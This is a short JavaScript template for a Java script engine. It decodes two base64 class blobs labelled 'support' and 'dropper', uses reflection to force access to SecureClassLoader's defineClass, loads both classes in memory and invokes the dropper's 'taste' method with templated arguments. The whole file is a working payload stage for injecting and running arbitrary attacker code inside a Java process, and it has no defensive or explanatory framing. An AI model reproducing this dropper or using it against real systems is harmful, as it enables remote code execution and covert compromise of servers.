var parentCl = java.lang.Thread.currentThread().getContextClassLoader();
var supportClassName = "{0}";
var dropperClassName = "{1}";
// todo: support old jdk
var supportBytecode = java.nio.ByteBuffer.wrap(java.util.Base64.getDecoder().decode("{2}"));
var dropperBytecode = java.nio.ByteBuffer.wrap(java.util.Base64.getDecoder().decode("{3}"));

var sclClazz = java.security.SecureClassLoader.class;
var sclConstructor = sclClazz.getDeclaredConstructor(java.lang.ClassLoader.class);
sclConstructor.setAccessible(true);
var scl = sclConstructor.newInstance(parentCl);
var defineClass = sclClazz.getDeclaredMethod("defineClass", java.lang.String.class, java.nio.ByteBuffer.class, java.security.CodeSource.class);
defineClass.setAccessible(true);

var supportClass = defineClass.invoke(scl, supportClassName, supportBytecode, null);
var dropperClass = defineClass.invoke(scl, dropperClassName, dropperBytecode, null);
dropperClass.getMethod("taste", java.lang.String.class, java.lang.String.class).invoke(null, "{4}", "{5}");